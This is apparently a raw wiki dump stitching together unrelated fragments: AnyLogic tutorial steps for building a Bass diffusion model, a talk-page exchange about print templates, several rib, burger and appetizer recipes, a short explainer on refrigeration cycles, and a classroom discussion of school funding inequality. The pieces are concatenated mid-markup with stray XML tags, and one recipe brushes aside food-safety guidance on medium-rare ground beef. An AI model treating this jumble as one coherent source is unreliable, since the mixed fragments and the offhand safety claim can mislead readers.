      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 3. Adding Stocks&lt;/big&gt;&lt;/big&gt;'''

Now we will add two stocks to model adopter and potential adopter populations.

[[File:Step_1._Creating_a_new_model1.gif]] '''Add a stock to model potential adopter population'''

#Drag the '''Stock Variable''' [[File:Adding stocks 1.gif]] element from the '''System Dynamics''' page of the '''Palette''' view onto the diagram of active object class (right to the place where you want to locate a variable). A new variable appears on the diagram, displayed as a little blue rectangle.&lt;/br&gt;[[File:Adding stocks 2.png]]
#Once you have placed the element onto the diagram, it becomes selected and its properties are displayed in the '''Properties''' view. You can adjust element properties here as your model requires.&lt;br /&gt;&lt;br /&gt;Please note that the '''Properties''' view is a context-sensitive view and it displays the properties of the currently selected element of the model. To adjust properties at a later time, first select the element (e.g. by clicking on the element in the graphical editor) and then modify the required properties.&lt;/br&gt;[[File:Adding stocks 3.png]]&lt;/br&gt;''Properties view. At the moment view displays the properties of the currently selected  stock variable.''
#Change the name of the stock. On the '''General''' page of the '''Properties''' view, type &lt;tt&gt;PotentialAdopters&lt;/tt&gt; in the '''Name''' edit box.&lt;/br&gt;[[File:Adding stocks 4.png]]

[[File:Step_1._Creating_a_new_model1.gif]] '''Add a stock to model adopter population'''

#Add another stock in the same way. Place it to the right of the &lt;tt&gt;PotentialAdopters&lt;/tt&gt; stock as shown in the figure below.&lt;/br&gt;[[File:Adding stocks 5.png]]
#Name this stock &lt;tt&gt;Adopters&lt;/tt&gt;.
#Move text labels of the stocks above stocks' icons. Do it in the following way: first select a variable by clicking on it (if selected, it is drawn in a blue outline and its label is underlined) and then drag the label wherever you like. Place labels as on the figure below:&lt;/br&gt;[[File:Adding stocks 6.png]]&lt;br /&gt;We need this since otherwise later these labels will be painted over with arrows pointing from one stock to other.  

At this point, the stocks are not defined properly. We have not defined integral functions and initial values for our stocks yet. But we will create the adoption flow first.

No need to add the divs on all the pages; in fact you can remove them for easier appearance.  I added class=&quot;noprint&quot; to [[Template:Navigate]]. &amp;ndash;&amp;nbsp;[[User:Adrignola|Adrignola]]&amp;nbsp;&lt;small&gt;[[User talk:Adrignola|talk]]&lt;/small&gt; 18:05, 10 December 2010 (UTC)

:Hahah! Now you tell me :) I'll rollback them tomorrow. If you have the power to undo them all at once, it's fine by me. What about [[Template:auto navigation]]? I checked its history and apparently it's automatically wrapped inside noinclude tags, but I could still see it in the print version. -[[User:Meev0|Meev0]] ([[User talk:Meev0|talk]]) 18:15, 10 December 2010 (UTC)

::If you have a /Print version page that is including other pages, you ''will'' still see any navigation templates on that page, unless you add {{tag|noinclude}} around the templates when you use them in the book.  But that's extra work too.  If you go to File... Print preview in your browser (or simply print), those navigation templates you see on the print version page will not appear in the output.  That's also true if you just go to print one page of the book. &amp;ndash;&amp;nbsp;[[User:Adrignola|Adrignola]]&amp;nbsp;&lt;small&gt;[[User talk:Adrignola|talk]]&lt;/small&gt; 18:28, 10 December 2010 (UTC)

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 4. Adding Adoption Flow&lt;/big&gt;&lt;/big&gt;'''

We have successfully created two stocks representing population pools. It is time to create flows of our model now. Our model has just one flow  - a flow of adoption, which increases the adopter population, while decreasing the potential adopter population.

[[File:Step_1._Creating_a_new_model1.gif]]'''Add a flow from PotentialAdopters to Adopters'''

#We will add a flow using AnyLogic ''flow tool''. Flow tool creates flow variable and sets up stocks so their values are changed with the specified flow value automatically. 
#To create flow, double-click &lt;tt&gt;PotentialAdopters&lt;/tt&gt; variable and then click &lt;tt&gt;Adopters&lt;/tt&gt; variable.
#AnyLogic creates new flow variable and makes it an outflow for &lt;tt&gt;PotentialAdopters&lt;/tt&gt; and an inflow for &lt;tt&gt;Adopters&lt;/tt&gt;. Arrows appeared on the stock and flow diagram denote flow influence on population pools.
#Select the flow in the graphical editor and change its name from default &lt;tt&gt;flowAuxVar&lt;/tt&gt; to &lt;tt&gt;AdoptionRate&lt;/tt&gt;. When finished, please press &lt;tt&gt;Ctrl+Enter&lt;/tt&gt; to rename flow names mentioned in formulas of stocks also.&lt;/br&gt;[[File:Adding adoption flow 1.png]]
#You can have a look at stock properties now. AnyLogic automatically adjusts formulas for stocks. The value of inflows i.e. flows that increase stock value, are added and the value of outflows, i.e. flows that decrease stock are subtracted from the current value of the stock. In our case we should have the following formulas defined:&lt;/br&gt;[[File:Adding adoption flow 2.png]]&lt;/br&gt;[[File:Adding adoption flow 3.png]]

We will define the formula calculating the value of the flow a little bit later.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 5. Adding Constants&lt;/big&gt;&lt;/big&gt;'''

Now we will define constants of our model. In AnyLogic you define a constant by creating a parameter.

[[File:Step_1._Creating_a_new_model1.gif]] '''Define a constant representing total population'''

#Drag the '''Parameter''' [[File:Step_3._Adding_Adoption_from_Advertisement1.gif‎]] element from the '''System Dynamics''' page of the '''Palette''' view onto the diagram of active object class.
#On the '''General''' page of the '''Properties''' view, set up the parameter properties.
#Change the name of the constant. Type &lt;tt&gt;TotalPopulation&lt;/tt&gt; in the '''Name''' edit box.
#In the '''Default Value''' edit box, type &lt;tt&gt;100000&lt;/tt&gt;. This will be the total population in our model.&lt;/br&gt;[[File:Adding constants 1.png]]

The rate, with which potential adopters come into contact with adopters, is assumed to be constant. So, we will define a constant to represent contact rate.

[[File:Step_1._Creating_a_new_model1.gif]] '''Define the &lt;tt&gt;ContactRate&lt;/tt&gt; constant'''

#Define the constant in the same way. Enter the '''Name''': &lt;tt&gt;ContactRate&lt;/tt&gt;.
#Assume a contact rate of 100 per person per year. In the '''Default Value''', type &lt;tt&gt;100&lt;/tt&gt;.&lt;/br&gt;[[File:Adding constants 2.png]]

In this model the volume of advertising and the probability that a potential adopter will adopt as the result of exposure to a given amount of advertising are assumed to be constant each period. So, we will add a constant to model the advertising effectiveness — the fractional adoption rate from advertising.

[[File:Step_1._Creating_a_new_model1.gif]] '''Define a constant representing advertising effectiveness'''

#Define a constant in the similar way. Name it &lt;tt&gt;AdEffectiveness&lt;/tt&gt;.
#Set the value to &lt;tt&gt;0.011&lt;/tt&gt;.&lt;/br&gt;[[File:Adding constants 3.png]]

Define one more constant to specify the adoption fraction — the proportion of contacts that are sufficiently persuasive to induce the potential adopter to purchase the product.

[[File:Step_1._Creating_a_new_model1.gif]] '''Define the &lt;tt&gt;AdoptionFraction&lt;/tt&gt; constant'''

#Name the constant &lt;tt&gt;AdoptionFraction&lt;/tt&gt;.
#Set the value to &lt;tt&gt;0.015&lt;/tt&gt;.&lt;/br&gt;[[File:Adding constants 4.png]]

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 6. Defining Initial Values of Stocks&lt;/big&gt;&lt;/big&gt;'''

Now we are ready to specify the initial values of stocks.

[[File:Step_1._Creating_a_new_model1.gif‎]]'''Define the initial number of potential adopters'''

#Click the &lt;tt&gt;PotentialAdopters&lt;/tt&gt; variable in the graphical editor.
#On the '''General''' page of the '''Properties''' view, type &lt;tt&gt;TotalPopulation&lt;/tt&gt; in the '''Initial Value''' edit box. Use intelli-sense mechanism to avoid typing the whole names of variables and functions. To open the intelli-sense wizard, click at the desired position in the edit box, and then press &lt;tt&gt;Ctrl+space&lt;/tt&gt;.&lt;/br&gt;[[File:Defining initial values of stocks.png]]&lt;/br&gt;The wizard listing model variables and functions appears. Scroll to the name you want to add, or type the first letters of the name until it becomes visible in the list. Finally, press Enter to insert the name.

We do not need to set up the initial value for the Adopters stock explicitly since there are no adopters initially and the stock is already initialized with zero by default.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 7. Adding Auxiliaries&lt;/big&gt;&lt;/big&gt;'''

We need to add two auxiliaries representing adoptions resulting from word of mouth and from advertising.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create the &lt;tt&gt;AdoptionFromAd&lt;/tt&gt; auxiliary'''

#Drag the '''Flow Aux Variable''' [[File:Step 7. Adding auxiliaries 1.gif]] element from the '''System Dynamics''' page of the '''Palette''' view onto the diagram of active object class (right to the place where you want to locate a variable).
#In the '''Properties''' view, change the '''Name''' to &lt;tt&gt;AdoptionFromAd&lt;/tt&gt;.
#Define the formula expression. In the '''AdoptionFromAd''' = edit box, type:  &lt;tt&gt;AdEffectiveness*PotentialAdopters&lt;/tt&gt;&lt;/br&gt;[[File:Step 7. Adding auxiliaries 2.png]]

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create the &lt;tt&gt;AdoptionFromWOM&lt;/tt&gt; auxiliary'''

#Do it in the same way except name the auxiliary &lt;tt&gt;AdoptionFromWOM&lt;/tt&gt; and specify the following formula:
#:&lt;code&gt;ContactRate*AdoptionFraction*PotentialAdopters*Adopters/TotalPopulation&lt;/code&gt;
:[[File:Step 7. Adding auxiliaries 3.png]]

Now we can formulate the adoption flow using just defined auxiliares. The two sources of adoption are assumed to be independent. Thus, the total adoption rate is the sum of adoptions resulting from word of mouth driven by the population of adopters and adoptions resulting from advertising.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Define the formula for the adoption rate'''

#Click the just created flow variable on the diagram.
#Go to the '''General''' page of the '''Properties''' view.

Now we have completely defined our model. The stock and flow diagram of the model should look like as on the figure below.

:[[File:Step 7. Adding auxiliaries 5.png]]

You may examine the causal dependencies between stocks, flows and auxiliaries in your model. They are denoted with arrows as in standard SD notation. 

* A thick arrow going from flow to stock means that this flow acts as inflow for this stock. 
* A thick arrow going from stock to flow means that this flow acts as outflow. 
* A thin arrow going from A variable to B means that A causes to change B. 

You can see that our model has one balancing and one reinforcing feedback loop. 

* A balancing feedback loop affects the adoption rate due to advertising. The adoption rate reduces the pool of the potential adopters, which in turn decreases the adoption rate.
* A reinforcing loop affects the adoption rate due to word of mouth. The adoption rate increases the adopter population, resulting in an increase of word of mouth, and thus the increase of the adoption rate.</text>

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 8. Configuring Simulation&lt;/big&gt;&lt;/big&gt;'''

Model simulation has a set of specific settings. A group of model settings is called an experiment, and experiments are displayed at the bottom of the model branch in the workspace tree. You can create several experiments for the same model with alternative model settings. One experiment is created by default and named &lt;tt&gt;Simulation&lt;/tt&gt;.

:[[File:Step 8. Configuring simulation 1.png]]

It is a simulation experiment, enabling model simulation with customized parameter values.

There are also other types of experiments (optimization, risk assessment, parameter variations experiment), used when the model parameters play a significant role and you need to analyze how they affect the model behavior, or when you want to find optimal parameters of your model.  

If we start the model, it will work 100 time units and then will stop. Since we want to observe only how the model behaves when the adoption process takes place, we need to stop the model when the system comes to equilibrium. The adoption process in this model lasts something over 10 years.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Set the model to stop at time 10'''

#In the '''Project''' view, click the &lt;tt&gt;Simulation:Main&lt;/tt&gt; experiment item.
#On the '''Model Time''' tab of the '''Properties''' window, choose '''Stop at specified time''' from the '''Stop''' drop-down list. In the edit box on the right, type &lt;tt&gt;10&lt;/tt&gt;. The model will stop after 10 model time units elapse.&lt;/br&gt;[[File:Step 8. Configuring simulation 2.png]]

Before running the model, we will set the real time mode to control the execution speed and, consequently, animation speed. In real time mode, the model is executed regarding the physical time. 

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Set the real time execution mode'''

{{BookCat}}
#In the '''Project''' view, click the &lt;tt&gt;Simulation&lt;/tt&gt; experiment.
#On the '''Presentation''' page of the '''Properties''' view, go to the '''Execution mode''' section and choose the '''Real time with scale''' option.
#Specify the model execution speed, i.e., how many model time units will be executed in one second. In the edit box to the right, type &lt;tt&gt;2&lt;/tt&gt;.&lt;/br&gt;[[File:Step 8. Configuring simulation 3.png]]</text>

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 9. Running the Model&lt;/big&gt;&lt;/big&gt;'''

Build your project by clicking the '''Build Model''' [[File:Step_7._Running_the_model.gif‎]] toolbar button. If there are some errors in your model, the building fails and the '''Problems''' view appears listing all the errors found in your model. Click '''All''' button in the upper right corner of the view to show all errors in the model and then double-click an error in the list to open the location of the error and fix it.

:[[File:Step_7._Running_the_model1.png]]&lt;/br&gt;''Problems view''

After the model is successfully built, you can start it. Running the simulation, you automatically bring the current model up to date.  

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Start the model'''

#Click the '''Run''' [[File:Step_7._Running_the_model2.gif‎]] toolbar button and choose the experiment you want to run from the drop-down list. Your simulation experiment is called &lt;tt&gt;Bass Diffusion/Simulation&lt;/tt&gt;.&lt;/br&gt;[[File:Step 9. Running the model 1.png]]&lt;br /&gt;In the case this model is the only one opened in the workspace at the moment you will be prompted to run this particular experiment. Later on this button will start the previously run experiment. To run any other experiment, right-click the experiment in the '''Project''' view and choose '''Run''' from the context menu.
#Having started the model, you will see the presentation window. It displays the presentation designed for your simulation experiment. AnyLogic automatically places the show-bench title and the button enabling running your model and switching to the presentation designed for the &lt;tt&gt;Main&lt;/tt&gt; class.&lt;/br&gt;[[File:Step 9. Running the model 2.png]]
#You can see animated stock-and-flow diagram. Elements of the diagram match the system dynamics notation. The actual values of variables are displayed as well.
#You can adjust the execution speed to your needs using '''Slow down''' and '''Speed up''' toolbar buttons.&lt;/br&gt;[[File:Step 9. Running the model 3.png]]

AnyLogic supports various tools for collecting, displaying, and analyzing data during model execution. The simpliest way to examine current state and history of a parameter or a variable during model simulation is to use inspect window. We want to inspect our variables &lt;tt&gt;AdoptionFromAd&lt;/tt&gt; and &lt;tt&gt;AdoptionFromWOM&lt;/tt&gt; to view the contribution of different adoption sources. 

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Inspect adoption sources'''

#Click the &lt;tt&gt;AdoptionFromAd&lt;/tt&gt; variable in the presentation. The yellow popup box will be shown. If needed, move it by dragging the toolbar of the window and resize it to the desired size by dragging the lower right corner of the window..
#By default the window is in inspect mode - it displays the current value of the variable. You can switch it to the plot mode by clicking the &quot;rectangle&quot; button in the upper right corner of the window. Now it shows the time plot showing the trend for &lt;tt&gt;AdoptionFromAd&lt;/tt&gt; variable. 
#In the same way, open inspect window for &lt;tt&gt;AdoptionFromWOM&lt;/tt&gt; and switch it to the plot mode.&lt;/br&gt;[[File:Step 9. Running the model 4.png]]

&quot;Inspect&quot; charts change scales automatically to embrace the plots, displaying the variables changing from the beginning to the end of simulation. We can easily see that when an innovation is introduced and the adopter population is zero, the only source of adoption will be advertising. The advertising effect is largest at the start of the diffusion process and steadily diminishes as the pool of potential adopters is depleted.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 10. Adding Charts&lt;/big&gt;&lt;/big&gt;'''

You can also observe how the values of variables change during the simulation using charts. Namely, we want to examine the adopter and potential adopters populations dynamics. We will also use the same chart to show how the adoption rate changes in our model.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create a data set for the &lt;tt&gt;PotentialAdopters&lt;/tt&gt; variable'''

#In the graphical editor, right-click the &lt;tt&gt;PotentialAdopters&lt;/tt&gt; variable and choose '''Create Data Set''' from the popup menu. The data set &lt;tt&gt;PotentialAdoptersDS&lt;/tt&gt; will be created. It will store the history of the variable that can be displayed on the chart. Move the data set icon aside like shown on the figure below.&lt;/br&gt;[[File:Step 10. Adding charts 1.png]]
#Go to the '''General''' page of the '''Properties''' view.
#Specify the data set title in the '''Title''' edit box: # &lt;tt&gt;of potential adopters&lt;/tt&gt;. It will be displayed in the legend displayed for this data item in the chart.
#Clear the '''Show at Runtime''' check box to prevent showing the data set icon in the presentation window at model runtime.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create one more data set for Adopters'''

#Create data set for the Adopters variable in the same way and set up its title: # &lt;tt&gt;of adopters&lt;/tt&gt;.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Draw a time plot displaying adopter and potential adopter population pools'''

#Drag the '''Time Plot''' [[File:Step_5._Adding_charts1.gif‎]] element from the '''Analysis''' page of the '''Palette''' view into the graphical editor (right to the place where you want to locate this chart).
#Resize it as shown on the figure.&lt;/br&gt;[[File:Step 10. Adding charts 2.png]]
#Go to the '''General''' page of the '''Properties''' view.
#Set up the chart’s time diapason. In the '''Time Window''' edit box, type: &lt;tt&gt;8&lt;/tt&gt; (so the chart will display all the simulation run).
#Specify data sets to be displayed on the time plot. 
#Add &lt;tt&gt;PotentialAdoptersDS&lt;/tt&gt; data set to be visualized on this plot by clicking the '''Add Data Set''' button and defining settings for the data set in the property section above. Choose &lt;tt&gt;PotentialAdoptersDS&lt;/tt&gt; data set from the '''Data Set''' drop-down list. Choose the first option from the '''Point Style''' drop-down list to turn off indicating data set values with a marker.
#Add &lt;tt&gt;AdoptersDS&lt;/tt&gt; data set in the same way.
#Define how the plot will be updated with new data set values. At the botom of the properties page, choose '''Update automatically''' option and specify the update rate in the '''Recurrence (in time units)''' edit box to the right: &lt;tt&gt;0.1&lt;/tt&gt;.&lt;/br&gt;[[File:Step 10. Adding charts 3.png]]

Now you can run the model and examine the trend of potential adopter and adopter populations over time. You will see classic S-shaped diffusion curves.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 11. Modeling Replacement Purchases&lt;/big&gt;&lt;/big&gt;'''

The model we have created does not capture situations where the product is consumed, discarded, or upgraded, all of which lead to repeat purchases. We will model repeat purchase behavior by assuming that adopters move back into the population of potential adopters when their first unit is discarded or consumed.

First, we will define a constant representing the average life time of product.

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Create the &lt;tt&gt;ProductLifeTime&lt;/tt&gt; constant'''

#Assume that the average duration of active use of our product is 2 years. Type &lt;tt&gt;2&lt;/tt&gt; as the '''Default Value'''.&lt;/br&gt;[[File:Step 11. Modeling replacement purchases 1.png]]

People move back from the adopter population to the pool of potential adopters when the product they have purchased is discarded or consumed. So, the discard flow is nothing else but the adoption flow delayed on the average life time of the product.

[[File:Step_1._Creating_a_new_model1.gif‎]]  '''Create the discard flow &lt;tt&gt;Adopters&lt;/tt&gt; to &lt;tt&gt;PotentialAdopters&lt;/tt&gt;'''

#First, double-click &lt;tt&gt;Adopters&lt;/tt&gt; stock in the graphical editor.
#Then click &lt;tt&gt;PotentialAdopters&lt;/tt&gt; variable.
#New flow from &lt;tt&gt;Adopters&lt;/tt&gt; to &lt;tt&gt;PotentialAdopters&lt;/tt&gt; is added. Change the name of the flow to &lt;tt&gt;DiscardRate&lt;/tt&gt; (do not forget to press &lt;tt&gt;Ctrl+Enter&lt;/tt&gt; when finished typing new flow name).
#You can see that stock formulas have changed as well:&lt;/br&gt;[[File:Step 11. Modeling replacement purchases 2.png]]    [[File:Step 11. Modeling replacement purchases 3.png]]
#Set the following formula for the flow variable:&lt;br /&gt;&lt;code&gt;delay(AdoptionRate, ProductLifeTime)&lt;/code&gt;&lt;br /&gt;[[File:Step 11. Modeling replacement purchases 4.png]]&lt;/br&gt;The &lt;tt&gt;delay()&lt;/tt&gt; function implements the time delay and has the following notation:&lt;br /&gt;&lt;code&gt;delay(&lt;variable&gt;, &lt;delay value&gt;, &lt;initial value&gt;)&lt;/code&gt;&lt;br /&gt;In our case, function reproduces AdoptionRate delayed on the &lt;tt&gt;ProductLifeTime&lt;/tt&gt; value. The discard rate is null until the time of use of the first purchased products elapses.

Now we have finished modeling the product replacement purchases. You may check how the &lt;tt&gt;delay&lt;/tt&gt; function works. Run the model and view plots for &lt;tt&gt;AdoptionRate&lt;/tt&gt; and &lt;tt&gt;DiscardRate&lt;/tt&gt;. You can see that rate curves look exactly how we expected — the discard rate is actually the adoption rate delayed by 2 years — the life time of the product.

Observe the population dynamics using the chart. Now, instead of falling to zero, the potential adopter population is constantly replenished as adopters discard the product and reenter the market. The adoption rate rises, peaks, and falls to a rate that depends on the average life of the product and the parameters determining the adoption rate. Discards mean there is always some fraction of the population in the potential adopter pool.

If you like, you may add control group varying product life time, say from 0.5 to 10.

Yes, the sauce isn't tomato based, but unless you want it to taste like a stew, stay with vinegar based.

== Ingredients ==
*2 1/2 pounds cut-up baby back pork ribs
*[[Cookbook:Rib Rub|Rib Rub]]
*1/2 cup apple cider vinegar
*1/3 cup honey
*2 tbs Worcestershire sauce
*1 tbs hickory-flavored liquid smoke
*1 tbs all-purpose flour

== Procedure ==
#Season ribs liberally with Rub. Refrigerate overnight.
#The next day, combine remaining ingredients. Place ribs in the bottom of a slow cooker and pour mixture over. Cover and cook on low 8-9 hours or until ribs are tender. Serve warm.</text>

== Ingredients ==
* 1 slab of either baby back ribs, or St. Louis cut pork ribs
* [[Cookbook:Rib Rub|Rib Rub]]
* Untreated hickory wood chips
* Your favorite barbecue sauce

== Procedure ==
#Season ribs liberally with Rub. Refrigerate overnight.
#The next day, place a good amount of hickory chips in the bottom of a roasting pan. Place a rack in the pan and place ribs on the rack.
#Cover with aluminum foil and place in the middle of a 200 degree F oven. Cook 6 hours for baby back ribs, and 8 hours for St. Louis cut ribs, changing chips as needed.
#Brush side facing you liberally with sauce. Remove foil and place under a preheated broiler until well browned. Serve warm.

== Warnings ==

Since I believe your house isn't a specially designed restaurant with advanced air filtration systems, follow this advice: Keep a kitchen fan running, and remember that even the best ventilation systems (at least the ones made for home use) will not work unless you keep a window open.</text>

      <text xml:space="preserve">&lt;p style=&quot;text-align:center;&quot;&gt;Refrigeration Loops and Heat Pumps&lt;/p&gt;

It was long ago established that moving heat was less expensive than creating it. Your refrigerator at home, and your freezer if you have one, take heat out of an insulated box, and release it into the room. Thus cooling food to make it last longer. The techniques for doing so were invented long ago, and in fact have not changed significantly since the days of steam engines. What has changed is the chemical nature of the refrigerant, and therefore the temperatures at which it is more economical to pump heat, and the efficiency of the compressors.

The refrigeration cycle is very simple, first, a refrigerant is compressed to form a liquid, then cooled, then the liquid is pumped through a constriction and allowed to expand into its gaseous state, during which it absorbs heat. The selection of whether you put the cool side or the hot side of the loop inside your box, determines whether you heat or cool the box.

A heat pump designed for HVAC, is only a little bit more complex, because it allows you to switch the piping so that during the summer the house is cooled, and during the winter the house is heated. This is possible because a special valve can be switched each season in order to set the direction of the heat.

Stuffed burgers are gaining popularity because you don't really know what you're gonna bite down on. Stuffing? Meat?

== Ingredients ==
* 1 pound (80/20 fat ratio) ground chuck
* 4 slices crisp-cooked bacon, crumbled
* 4 slices pepper jack cheese, torn
* 1/4 large onion, finely diced
* 3 tbs shredded Monterrey Jack cheese
* salt and freshly ground black pepper
* 2 cloves garlic, smashed and minced
* Olive oil
* 3 tbs unsalted butter
* 4 hamburger buns, split and toasted
* Melted butter

== Procedure ==
#Heat 2 tbs olive oil in a large skillet over medium high heat. Add garlic and onion and cook until garlic is golden.
#Combine cheeses, bacon, cooked onion and garlic, and butter. Set aside.
#Form meat into 8 equal patties. Make an indentation into the middle of each patty and place a dollop of cheese mixture into dent. Place 1 patty on top of each other, stuffing side down, and push down until patty is about 3/4 inch thick. Set aside while you heat your trusty charcoal grill (not with that solvent stuff).
#Brush patties with olive oil and season liberally on both sides with salt and freshly ground black pepper. Set down on grill and cook, turning often, until instant-read thermometer inserted into the meat, not the stuffing, reads desired temperature. (Contrary to popular belief, it is safe to have medium-rare burgers. Screw the feds for planting all those ideas in your heads.)
#Brush the cut side of each bun with melted butter. Place a patty on top of a bottom half of a bun and top with a top half of a bun. Serve warm.</text>

This is great as an appetizer for your next dinner party.

== Ingredients ==
* 30 cherry tomatoes, very top removed (Why so much? Because these go in no time flat.)
* 1/4 cup cream cheese
* 1 tbs basil chiffonade
* 1 tbs minced garlic
* 2 tbs unsalted butter
* 1/2 tsp salt
* 1/2 tsp freshly ground black pepper
* 1/4 cup ricotta cheese

== Directions ==
#Combine all ingredients except tomatoes. Place into a gallon-size zip-top bag with a small hole snipped in one of the bottom corners. Fill tomatoes about 3/4 of the way full. Serve chilled as an appetizer.</text>

&lt;center&gt;[[File:Jonathan Kozol.jpg|400px]]&lt;/center&gt;
&lt;span style=&quot;font-size: medium;&quot;&gt;
Last semester me and some of my students were lucky enough to spend some one-on-one time with [Jonathan Kozol][http://en.wikipedia.org/wiki/Jonathan_Kozol] who wrote (among several other amazing books) Savage Inequalities [http://en.wikipedia.org/wiki/Savage_Inequalities].  The book is a passioned account of the plight of many inter-city school kids in grossly underfunded schools. His work has helped to shed light on the injustice of the system by which our schools are funded.

In lecture on this topic, I mention a school district in Douglas, MA spends a little less than $8,000 per year per student while schools in neighboring Lexington, MA spend over $25,000 per year per student. These discrepancies are largely due to money obtained through property taxes: Douglas is in a poor area; Lexington an affluent one.

Situations such as these led the courts to this conclusion: the quality of child's education in America is a function of the wealth of his parents and neighbors.    

So, I ask you:

Is this true? 

Is this fair? 

Should rich communities be allowed to spend thousands more dollars per year on each child?

Should they have to give some of their money to the poor communities? 

Would you be willing to pay higher taxes in your community so someone else's kid can have a better education? 

&lt;/span&gt;

== Bring on the socialism. Equality for all! ==
Wow is right. I think that some of the tax money that rich people pay should go towards funding for schools that do not have the funds. Would taxpayers paying higher taxes even put a dent in some of the funding needed to help underfunded schoools? All schools should get an equal share of funding for their school. All children deserve not just a good education, but a great education. [[User:Msmhobbs04|Msmhobbs04]] ([[User talk:Msmhobbs04|talk]]) 13:29, 30 July 2009 (UTC)

Wow.  I wonder what the differences would be like around here.  How would you go about finding out the numbers or are the figures a closely guarded secret?  Anyway, of course it isn't fair and I'm a little unsure how this could be permitted to continue.  Doesn't the cycle of poverty continue if children in a poorer school district don't have as much access to funding?  Maybe it's because the taxes paid are based on the resident's income.  The money should be placed in 1 big pool to be equally distributed, in my opinion.  All of the children would benefit from equality in education funding.  
[[User:Ldomm002|Ldomm002]] ([[User talk:Ldomm002|talk]]) 02:45, 26 July 2009 (UTC)

These are shuch shocking numbers and its hard to believe that this type of extreme inequality still exists! I think that this is very true and that Mass. is not the only state and those are not the only cities facing this issue. This is definitely a highly debated issue that is occurring all over the country. In my opinion, no child should face a lesser education due to their parents income or the neighborhood they live in. Some parents choose to spend the additional money and send their child to private school (that is their choice and their money to spend how they please). In terms of public education, I do not think one child should be better off than another. I am not sure how exactly it would work, but it seems to me the money should be spent equally and all children receive an equal education. In the grand scheme of things we need to be thinking about the generation as a whole and educating all these children to the best of our ability (not just one or two select group of wealthy children). In turn, our society will see greater benefits! [[User:Khedl002|Khedl002]] ([[User talk:Khedl002|talk]]) 02:05, 26 July 2009 (UTC)khedl002

I would say that all schools should have equal opportunity and be provided with the same amount of money among other things.  I am not going to get into taxes and everything else...but possibly just collecting all taxes the way they have been.  And take the same percent from each person the pays taxes.  This bulk amount of money then divided evenly among all schools in, say, the state of VA.  I do not agree just because a school is in a poorer location there should be less money given because there are less taxes.  I believe there are many choices that can change to make it a better atmosphere for all students. [[User:Sston008|Sston008]] ([[User talk:Sston008|talk]]) 23:28, 25 July 2009 (UTC)

I really feel public schools should be equal no matter what neighborhood or area they are in.  Unfortunately that is not the case now and may never be the case.  All students are expected to perform well in schools yet so many schools are not at all up to the standards of some of the better schools.  People always say that all children should be treated equal and all students should be given the same opportunities within the school system, however how can that be said when schools all over the country are struggling to provide the necessary materials to give these students an excellent education.  I feel giving all children an equal education is always going to be a struggle. [[User:Lwill031|Lwill031]] ([[User talk:Lwill031|talk]]) 18:05, 24 July 2009 (UTC)

I believe that all schools should be on a more equal playing field.  It does not seem fair that some schools really suffer while others flourish.  There needs to be some kind of standards that are equal for all.  All students should have the same opportunities and should not be punished because they are from a poor community and therefore go to a poor school with little funding.  I believe that all states needs to be equal with what they are given per child.  I do not believe that it would be right for someone who is rich to be responsible for paying for other children just because they have more money.  Something needs to be done per state.
[[User:Aferg006|Aferg006]] ([[User talk:Aferg006|talk]]) 02:05, 24 July 2009 (UTC) 


I do not believe that it is fair to have some schools funded better than others within the same state. I feel that all schools should be funded equally regardless of whether they are in an affluent or a poor neighborhood. I do not feel that it should be taken from people's taxes however, and I do not feel that the more affluent schools should have to give funds to the poverty stricken schools. I feel that there needs to be more state and government funding available for the poorer schools, so that it can be equal in funding to the affluent schools. I feel that there are different ways that the funding can be made equal besides taking it from people's taxes, or taking away from the funding of the more affluent schools. As opposed to taking away from their funding, find ways to make the poorer schools funding equal. Raise money, have fundraisers whatever it takes to provide equality among funding for schools. [[User:Rburt005|Rburt005]] ([[User talk:Rburt005|talk]]) 15:58, 22 July 2009 (UTC)

I find it shocking that some school districts spend less than $8,000 per year per student yet other school districts spend more than $25,000 per year per student. Although this is true, I do not believe that this is fair and I think that there should be equality for all students and school systems. If rich communities are allowed to spend thousands of dollars per child, then the poor communities should be able to do this as well. In order to make it fair, I think that the rich communities should have to give some of their money to the poor communities. 	Although many probably would not agree, I would be willing to pay higher taxes in my community so that another child in a poor community can have a better education. This is probably because I want to be a teacher and I greatly value the educational quality of all students. [[User:Afett001|Afett001]] ([[User talk:Afett001|talk]]) 18:29, 22 July 2009 (UTC)

As negative as you've made the below choices for responses sound, I doubt anyone will pipe up for them. I do think the situation is true, I do not think it is necessarily fair– but to be the blatant pessimist, not much in life is fair. It is funny how many people are willing to lend their voice for support whenever the term equality pops up, but when it comes to be taxed for such things they bite their thumb. Socialism has become that of a negative term in this country, and for gods know what logical reasoning. Regardless, it's going to be quite impossible to bring equality to every child's educational experience unless absolutely everything were publicly funded and supplied identically. It'd also call of a full fledged strict national curriculum and standards as to not bring discrepancies to any district in teaching methods and material. It's an optimistic and benevolent outlook, but a bit of a naive one too. The best bet is to fund organizations/programs to help better education in these areas through means of monetary contributions and social networking. Or slap me for being silly.

